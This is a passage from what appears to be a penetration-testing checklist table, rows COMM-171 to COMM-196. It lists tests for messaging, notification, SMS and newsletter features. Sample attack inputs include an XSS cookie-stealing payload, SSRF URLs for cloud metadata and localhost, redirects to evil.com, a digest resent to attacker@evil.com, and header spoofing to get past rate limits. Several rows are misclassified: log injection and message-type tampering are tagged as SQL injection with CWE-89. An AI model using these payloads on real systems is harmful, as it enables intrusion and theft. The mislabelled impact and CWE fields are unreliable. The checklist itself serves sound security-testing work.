| COMM-171 | Broadcast API Key Exposure | Information Disclosure (WSTG-INFO-05) | Announcement / Broadcast | 1. Check if broadcast sending uses API keys or tokens.<br>2. Search client-side code for exposed broadcast API keys.<br>3. Test if exposed keys allow unauthorized broadcasting. | Application must keep broadcast API keys server-side only and never expose them in client-accessible code. | <code>Search JavaScript files for broadcast_api_key;push_server_key;fcm_server_key;notification_secret</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Browser DevTools;GitLeaks;TruffleHog | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-172 | Broadcast Message Replay Attack | Session Management (WSTG-SESS-03) | Announcement / Broadcast | 1. Capture a broadcast message request.<br>2. Replay the same request multiple times.<br>3. Check if duplicate broadcasts are sent.<br>4. Verify idempotency controls. | Application must implement idempotency tokens to prevent duplicate broadcast sends from replayed requests. | <code>Replay POST /api/broadcasts/send with same payload 50 times and check for duplicate broadcasts</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-173 | Email Notification Queue Poisoning | Injection (WSTG-INPV-01) | Email Notifications | 1. If the email notification system uses a message queue test for queue poisoning.<br>2. Inject malicious messages into the queue.<br>3. Check for deserialization or command injection in queue consumers. | Application must validate and sanitize all data in the notification queue and prevent unauthorized queue access. | <code>Inject malicious serialized objects or commands into email notification queue;test for deserialization attacks</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-174 | SMS API Key Exposure | Information Disclosure (WSTG-INFO-05) | SMS Notifications | 1. Search client-side code for SMS API credentials.<br>2. Check for Twilio or Nexmo or other SMS provider API keys in JavaScript.<br>3. Test if exposed keys allow unauthorized SMS sending. | Application must keep SMS provider API keys server-side only and never expose them in client-accessible code. | <code>Search JS files for twilio_sid;twilio_auth_token;nexmo_api_key;sms_api_secret</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Browser DevTools;GitLeaks;TruffleHog | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-175 | FCM/APNs Server Key Exposure | Information Disclosure (WSTG-INFO-05) | Push Notifications | 1. Search for Firebase Cloud Messaging or Apple Push Notification service credentials in client code.<br>2. Check for server keys in mobile app decompilation.<br>3. Test if keys allow unauthorized push sending. | Application must protect FCM/APNs server keys and never expose them in client-side code or mobile applications. | <code>Search for AIzaSy;AAAA (FCM key patterns);check mobile app for embedded server keys</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Browser DevTools;apktool;jadx;GitLeaks | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-176 | Chat End-to-End Encryption Verification | Cryptography (WSTG-CRYP-01) | Chat / Messaging | 1. If E2E encryption is claimed verify the implementation.<br>2. Check if encryption keys are properly managed.<br>3. Test if the server can access plain-text messages.<br>4. Verify key exchange protocol. | Application must implement proper E2E encryption with verified key exchange if claimed and ensure the server cannot access plain-text message content. | <code>Capture encrypted messages;verify key exchange;check if server stores plain-text copies;test key rotation</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Wireshark;mitmproxy;Custom Scripts | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| COMM-177 | Chat Message Forwarding Authorization | Broken Access Control (WSTG-AUTHZ-02) | Chat / Messaging | 1. Forward a chat message from a private conversation.<br>2. Check if forwarding restrictions are enforced.<br>3. Verify if forwarded messages maintain original context and attribution. | Application must enforce forwarding restrictions based on conversation privacy settings and maintain message attribution. | <code>Forward message from restricted conversation to public channel;check if forward_restricted flag is enforced</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-178 | Video Call Bandwidth Abuse for DoS | Business Logic (WSTG-BUSL-05) | Video Calling | 1. Join a video call and send extremely high-resolution video or rapid quality changes.<br>2. Check if bandwidth limits are enforced.<br>3. Monitor for impact on other participants. | Application must implement bandwidth limits and quality controls per participant to prevent denial-of-service through resource abuse. | <code>Stream 4K video in a call;rapidly switch between quality levels;send large screen share payloads</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | WebRTC Internals;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| COMM-179 | Contact Form Log Injection | Injection (WSTG-INPV-15) | Contact Form | 1. Submit the contact form with log injection payloads.<br>2. Include newlines and fake log entries in message fields.<br>3. Check if log files are contaminated. | Application must sanitize all logged data from contact form submissions to prevent log injection and forgery. | <code>message=Normal message\n[2025-01-01 00:00:00] ADMIN: System compromised\n[CRITICAL] Unauthorized access detected</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-180 | Newsletter Preference Center Open Redirect | Open Redirect (WSTG-CLNT-04) | Newsletter Subscription | 1. Access the newsletter preference center.<br>2. Check for redirect parameters in the URL.<br>3. Modify redirect URLs to external sites.<br>4. Verify redirect validation. | Application must validate all redirect URLs in the newsletter preference center against an allowlist. | <code>/newsletter/preferences?return_url=https://evil.com;/newsletter/manage?redirect=//evil.com/phishing</code> | Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser | CWE-601; [Open Redirect kit](#/checklist/openredir); PortSwigger; PayloadsAllTheThings |
| COMM-181 | Announcement Visibility Escalation | Broken Access Control (WSTG-AUTHZ-02) | Announcement / Broadcast | 1. Create a draft or internal announcement.<br>2. Intercept and change visibility from draft to published or from internal to public.<br>3. Check if visibility controls are enforced. | Application must enforce announcement visibility controls server-side and require proper authorization for visibility changes. | <code>Change visibility=draft to visibility=published or scope=internal to scope=public in announcement update</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-182 | Email Notification Template Overwrite | Broken Access Control (WSTG-AUTHZ-02) | Email Notifications | 1. Check if email notification templates can be modified.<br>2. Attempt to overwrite system templates with malicious content.<br>3. Access template management endpoints with regular user credentials. | Application must restrict email template management to authorized admin roles and implement version control for templates. | <code>PUT /api/email-templates/password_reset with modified template content using regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-183 | SMS Callback URL Manipulation | SSRF (WSTG-INPV-19) | SMS Notifications | 1. If SMS notifications have delivery callback URLs intercept and modify them.<br>2. Set callback to internal service.<br>3. Check for SSRF through SMS delivery callbacks. | Application must validate SMS callback URLs against an allowlist and prevent access to internal network resources. | <code>sms_callback_url=http://169.254.169.254/latest/meta-data/;delivery_webhook=http://localhost:6379/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-184 | In-App Notification Real-Time XSS via WebSocket | Cross-Site Scripting (WSTG-INPV-02) | In-App Notifications | 1. If in-app notifications arrive via WebSocket craft a notification containing XSS payload.<br>2. Send via WebSocket or trigger through user action.<br>3. Check if XSS executes when notification renders in real-time. | Application must sanitize WebSocket notification content before DOM insertion to prevent real-time XSS attacks. | <code>WebSocket message: {"type":"notification";"content":"&lt;img src=x onerror=alert(document.cookie)&gt;";"title":"&lt;svg/onload=alert(1)&gt;"}</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;wscat;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-185 | Notification Center Broken Object-Level Authorization | Broken Access Control (WSTG-AUTHZ-04) | Notification Center | 1. Access individual notification details.<br>2. Enumerate notification IDs.<br>3. Access notifications belonging to other users.<br>4. Check for authorization on each notification access. | Application must verify user authorization for every individual notification access request. | <code>GET /api/notifications/details/NOTIF-0001 through NOTIF-9999 with automated enumeration checking authorization</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite Intruder;ffuf | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-186 | Digest Email Recipient Manipulation | Broken Access Control (WSTG-AUTHZ-04) | Digest Emails (Daily/Weekly) | 1. Trigger digest email generation.<br>2. Intercept and modify the recipient email address.<br>3. Check if digest is sent to an unauthorized email.<br>4. Verify recipient validation. | Application must determine digest email recipients server-side from authenticated user data and not accept client-specified recipients. | <code>Change digest_recipient=user@test.com to digest_recipient=attacker@evil.com in digest trigger request</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-187 | Transactional Email Rate Limiting Bypass | Business Logic (WSTG-BUSL-05) | Transactional Emails | 1. Trigger transactional emails rapidly.<br>2. Test rate limiting on different types like password reset and order confirmation.<br>3. Attempt bypass using distributed requests. | Application must implement per-user and per-type rate limiting on all transactional email triggers. | <code>Send 100+ password reset emails in 1 minute;rotate IP via X-Forwarded-For to bypass rate limits</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-188 | Chat Message Type Confusion Attack | Injection (WSTG-INPV-01) | Chat / Messaging | 1. Send chat messages with unexpected message types.<br>2. Change type from text to system or admin or notification.<br>3. Check if message type manipulation creates fake system messages. | Application must validate message types server-side and prevent users from sending messages with system or privileged types. | <code>Change message_type=text to message_type=system_alert or message_type=admin_notice in chat send request</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-189 | Video Call Metadata Leakage | Information Disclosure (WSTG-INFO-05) | Video Calling | 1. Join a video call.<br>2. Inspect all API responses and WebSocket messages for metadata.<br>3. Check for leakage of participant IP addresses or device information or location data. | Video call system must minimize metadata exposure and not leak participant identifying information beyond what is necessary. | <code>Check signaling messages for participant_ip;device_model;os_version;location;network_info in call metadata</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;wscat;Wireshark | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-190 | Contact Form Response Time Information Leakage | Information Disclosure (WSTG-INFO-01) | Contact Form | 1. Submit contact forms with various email addresses.<br>2. Measure response times.<br>3. Check if response time differences indicate whether an email is associated with an account. | Application must ensure consistent response times for contact form submissions regardless of whether the provided email is a registered account. | <code>Compare response times for contact form with registered vs unregistered emails across 100+ submissions</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-191 | Newsletter Subscription API Abuse for Email Validation | Information Disclosure (WSTG-INFO-04) | Newsletter Subscription | 1. Use the newsletter subscription endpoint to validate email addresses.<br>2. Check if responses differ for valid vs invalid email formats.<br>3. Use for email harvesting. | Application must not provide detailed validation feedback that could be used for email harvesting or enumeration. | <code>POST /api/newsletter/subscribe with various emails and analyze response differences for email existence discovery</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-192 | Announcement Rich Media SSRF | SSRF (WSTG-INPV-19) | Announcement / Broadcast | 1. If announcements support rich media with external URLs inject internal URLs.<br>2. Check if the server fetches media for preview or caching.<br>3. Monitor for SSRF. | Application must validate and whitelist all media URLs in announcements and prevent server-side fetching of internal resources. | <code>media_url=http://169.254.169.254/latest/meta-data/;image_url=http://localhost:8080/admin;video_url=http://internal:3306/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-193 | WebSocket Reconnection Token Theft | Session Management (WSTG-SESS-03) | Real-time Updates (WebSocket) | 1. Check if WebSocket uses reconnection tokens.<br>2. Capture the reconnection token.<br>3. Use the token from a different session.<br>4. Verify if session hijacking is possible via reconnection tokens. | Application must bind WebSocket reconnection tokens to the original session and validate them against the current authentication state. | <code>Capture ws_reconnect_token from WebSocket messages;use from different browser/session to hijack connection</code> | Session fixation/hijack -&gt; attacker rides the victim's authenticated session. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;Custom Scripts | CWE-384; [Account Takeover kit](#/checklist/ato); PortSwigger Session management |
| COMM-194 | Notification Preference Race Condition | Business Logic (WSTG-BUSL-08) | Notification Preferences | 1. Send concurrent preference update requests with conflicting values.<br>2. Check if the final state is inconsistent.<br>3. Verify atomicity of preference updates. | Application must implement atomic preference updates to prevent race conditions resulting in inconsistent notification settings. | <code>Send concurrent PUT requests: one with email_enabled=true and another with email_enabled=false simultaneously</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| COMM-195 | Chat Typing Indicator Privacy Leak | Privacy (WSTG-INFO-05) | Chat / Messaging | 1. Check if typing indicators are visible in conversations.<br>2. Verify if typing status can be monitored for users not in your contact list.<br>3. Test privacy controls on typing indicators. | Application must respect user privacy settings for typing indicators and not expose them to unauthorized observers. | <code>Subscribe to typing indicator WebSocket channel for non-contact users;GET /api/chat/typing-status?user_id=1002</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;wscat | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| COMM-196 | Chat Message Content Scanning Bypass | Business Logic (WSTG-BUSL-01) | Chat / Messaging | 1. If chat has content filtering or scanning send messages designed to bypass filters.<br>2. Use Unicode obfuscation or zero-width characters or encoding tricks.<br>3. Check filter effectiveness. | Application must implement robust content filtering that handles Unicode obfuscation and encoding bypass techniques. | <code>Send filtered_word with zero-width joiners: f​i​l​t​e​r​e​d;use homoglyphs;use invisible Unicode separators</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
